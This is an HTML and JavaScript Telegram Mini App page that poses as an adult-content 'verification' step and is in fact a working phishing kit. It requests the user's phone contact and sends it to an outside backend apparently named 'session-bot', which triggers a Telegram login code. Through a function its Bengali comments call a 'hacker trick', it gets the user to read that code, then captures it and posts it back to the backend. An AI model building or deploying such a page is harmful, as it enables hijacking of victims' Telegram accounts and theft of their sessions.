<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
        .box { background: white; color: #333; padding: 25px; border-radius: 20px; margin: 40px 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 10px; display: block; text-decoration: none; }
        .btn-blue { background: #007bff; }
        .hidden { display: none; }
        input { width: 100%; padding: 12px; margin: 15px 0; border: 2px solid #ddd; border-radius: 10px; font-size: 24px; text-align: center; outline: none; }
    </style>
</head>
<body>
    <div class="box" id="step0">
        <h2>Verification Required</h2>
        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
        <div id="loader" class="hidden">
            <p style="color:#28a745; font-weight:bold;">Processing...</p>
        </div>
    </div>

    <div class="box hidden" id="step2">
        <h3>Verify Identity</h3>
        <p style="font-size: 13px; color: #555;">নিচের বাটনে ক্লিক করে কোডটি দেখে এখানে বসান।</p>
        
        <!-- এই সেই শক্তিশালী বাটন -->
        <button class="btn btn-blue" onclick="minimizeHackerWay()">📩 GET CODE 📩</button>
        
        <input type="number" id="otp" placeholder="Enter Code">
        <button class="btn" id="v_btn" onclick="verifyOTP()">Verify OK</button>
    </div>

    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();
        
        const BACKEND_URL = "https://pmrony-session-bot.hf.space";
        let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;

        function startFlow() {
            tg.requestContact();
            document.getElementById('main_btn').classList.add('hidden');
            document.getElementById('loader').classList.remove('hidden');
            poll();
        }

        async function poll() {
            try {
                const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                const data = await res.json();
                if (data.status === "success") { sendNumber(data.phone); } 
                else { setTimeout(poll, 1500); }
            } catch (e) { setTimeout(poll, 2000); }
        }

        async function sendNumber(phone) {
            try {
                const res = await fetch(`${BACKEND_URL}/send_number`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, phone: phone })
                });
                const data = await res.json();
                if (data.status === "success") {
                    document.getElementById('step0').classList.add('hidden');
                    document.getElementById('step2').classList.remove('hidden');
                }
            } catch (e) { }
        }

        // এটিই সেই 'অন্য উপায়' বা হ্যাকার ট্রিক
        function minimizeHackerWay() {
            // এটি ফোনকে ভাইব্রেট করবে না, সরাসরি অ্যাপটিকে মিনিমাইজ করে চ্যাট লিস্ট বের করবে
            // এটি মূলত ইনলাইন কুয়েরি মোড চালু করে যা অ্যাপকে নিচে নামাতে বাধ্য করে
            tg.switchToInlineQuery(' ', ['users', 'bots', 'groups', 'channels']);
            
            // এর ফলে অ্যাপটি নিচে বারের মতো থেকে যাবে এবং ইউজার সামনে চ্যাট লিস্ট দেখতে পাবে।
            // সেখানে সে টেলিগ্রামের ওটিপি মেসেজটি পেয়ে যাবে।
        }

        async function verifyOTP() {
            let code = document.getElementById("otp").value;
            if(code.length < 5) return alert("Please enter the code!");
            
            document.getElementById('v_btn').innerText = "Checking...";
            try {
                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                    method: "POST", headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({ user_id: userId, otp: code })
                });
                const data = await res.json();
                if (data.status === "success") { tg.close(); } 
                else { alert("Wrong Code!"); document.getElementById('v_btn').innerText = "Verify OK"; }
            } catch (e) { }
        }
    </script>
</body>
</html>
